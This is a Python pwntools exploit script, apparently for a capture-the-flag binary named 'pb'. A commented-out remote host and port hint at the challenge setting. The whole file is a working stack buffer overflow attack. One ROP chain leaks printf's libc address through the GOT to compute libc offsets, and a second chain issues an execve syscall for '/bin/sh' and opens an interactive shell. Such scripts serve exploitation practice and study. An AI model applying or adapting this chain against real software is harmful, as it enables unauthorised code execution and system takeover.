from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./pb")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "glibc/libc.so.6"}

#p = remote('139.59.173.68', 30732)
p = process("./pb", env=ld_preload)
#p = gdb.debug("./pb", '''
#break *main
#break *box
#break *box + 188
#break *box + 226''', env=ld_preload)

p.recvline()

p.sendline(b"2")
p.recvline()

# functions
start = p64(0x4010d0)
box = p64(0x00000000004012c2)

# Padding
padA = b'A' * 48                    # PADDING
padB = b'B' * 8                     # RBP
padC = b'C' * 8                     # EIP

# Leak
printf_plt = p64(0x00000000004011dd)    # puts_pltgot ended up in a crash at 'leave'
printf_pltgot = p64(0x403fa8)

# gadgets
pop_rdi = p64(0x000000000040142b)
ret = p64(0x0000000000401016)
leave_ret = p64(0x0000000000401239)
pop_rbp = p64(0x0000000000401199)


# 1st Exploit - libc_printf leak
exploit = padA + box + pop_rdi + printf_pltgot + printf_plt + ret + box

#pause()
p.clean()
p.sendline(exploit)
p.recvlines(3)

# libc functions
leak = p.recvn(7).strip()
libc_printf = unpack(leak, 'all')
libc_base = libc_printf - 395120
libc_system = libc_printf - 64016
binsh = libc_printf + 1539880

# libc gadgets
libc_pop_rax = libc_base + 0x45eb0
libc_pop_rsi = libc_base + 0xda97d
libc_pop_rdx = libc_base + 0x167ced # pop rdx; call qword ptr [rax + 0x20];
libc_syscall = libc_base + 0x29db4
libc_edx_syscall = libc_base + 0x147cdc

# confirmations
print('libc_printf leak: ', hex(libc_printf))
print('libc_system leak: ', hex(libc_system))
print('/bin/sh leak: ', hex(binsh))

# 2nd Exploit - system('/bin/sh')
#pause()
p.sendline(b'2')
p.recvline()

padD = b'D' * 56

exploit2 = padD + pop_rdi + p64(binsh) + p64(libc_pop_rsi) + p64(0x0) + p64(libc_pop_rax) + p64(0x3b) + p64(libc_edx_syscall)

p.sendline(exploit2)
p.interactive()
